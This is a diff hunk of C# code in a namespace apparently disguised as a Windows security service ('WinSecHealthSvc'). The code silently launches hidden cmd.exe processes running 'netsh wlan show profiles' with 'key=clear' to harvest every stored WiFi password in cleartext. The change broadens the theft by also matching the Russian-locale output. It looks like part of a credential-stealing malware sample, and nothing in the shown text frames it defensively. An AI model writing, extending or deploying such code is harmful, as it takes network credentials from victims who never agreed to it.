@@ -781,14 +781,14 @@ namespace WinSecHealthSvc
             try {
                 var p2 = new Process { StartInfo = new ProcessStartInfo { FileName="cmd.exe", Arguments="/c netsh wlan show profiles", UseShellExecute=false, RedirectStandardOutput=true, CreateNoWindow=true } };
                 p2.Start(); var sb = new StringBuilder();
-                foreach (var line in p2.StandardOutput.ReadToEnd().Split('\n')) {
+                foreach (var line in p2.StandardOutput.ReadToEnd().Split(new char[] { '\n' })) {
                     if (!line.Contains(":")) continue;
-                    string name = line.Split(':')[1].Trim(); if (string.IsNullOrEmpty(name)) continue;
+                    string name = line.Split(new char[] { ':' })[1].Trim(); if (string.IsNullOrEmpty(name)) continue;
                     try {
                         var p3 = new Process { StartInfo = new ProcessStartInfo { FileName="cmd.exe", Arguments="/c netsh wlan show profile \""+name+"\" key=clear", UseShellExecute=false, RedirectStandardOutput=true, CreateNoWindow=true } };
                         p3.Start();
-                        foreach (var dl in p3.StandardOutput.ReadToEnd().Split('\n'))
-                            if (dl.Contains("Key Content")) { sb.AppendLine(name+" : "+dl.Split(':')[1].Trim()); break; }
+                        foreach (var dl in p3.StandardOutput.ReadToEnd().Split(new char[] { '\n' }))
+                            if (dl.Contains("Key Content") || dl.Contains("Содержимое ключа")) { sb.AppendLine(name+" : "+dl.Split(new char[] { ':' })[1].Trim()); break; }
                     } catch {}
                 }
                 return sb.Length > 0 ? sb.ToString() : "No WiFi passwords";
